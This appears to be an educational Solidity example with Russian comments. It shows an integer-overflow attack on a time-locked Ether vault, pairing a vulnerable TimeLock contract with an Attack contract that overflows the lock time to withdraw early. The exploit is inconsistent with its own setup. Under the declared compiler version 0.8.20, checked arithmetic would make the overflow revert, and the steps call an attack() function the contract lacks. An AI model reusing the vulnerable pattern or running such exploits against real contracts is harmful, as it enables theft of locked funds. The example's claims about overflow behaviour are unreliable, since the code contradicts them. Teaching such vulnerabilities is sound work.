// SPDX-License-Identifier: MIT
// compiler version must be greater than or equal to 0.8.20 and less than 0.9.0
pragma solidity ^0.8.20;
/* Этот контракт предназначен для того, чтобы действовать как хранилище времени.
Пользователь может внести депозит в этот контракт, но не может вывести средства в течение как минимум недели.
Пользователь также может продлить время ожидания сверх 1 недели.
*/
/*
1. Разверните TimeLock
2. Развернуть атаку с адресом TimeLock
3. Вызовите Attack.attack, отправив 1 эфир. Вы сразу же сможете
 Выведите свой эфир.

Что случилось?
Атака привела к переполнению TimeLock.lockTime и смогла выйти
до 1 недели ожидания.
*/
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }
    function increaseLockTime(uint _secondToIncrease) public {
        lockTime[msg.sender] += _secondToIncrease;
    }
    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient fund");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
contract Attack {
    TimeLock timeLock;
    constructor(TimeLock _timeLock){
    timeLock = TimeLock(_timeLock);
    }
    fallback() external payable{
        timeLock.deposit{value: msg.value}();
        /* если t = текущее время блокировки, то нам нужно найти x такое, что
 х + т = 2**256 = 0
 Таким образом, x = -t
 2**256 = тип(uint).max + 1
 Таким образом, x = type(uint).max + 1 - t
 */
       timeLock.increaseLockTime(
        type(uint).max + 1 - timeLock.lockTime(address(this))
       );
       timeLock.withdraw();
    }
}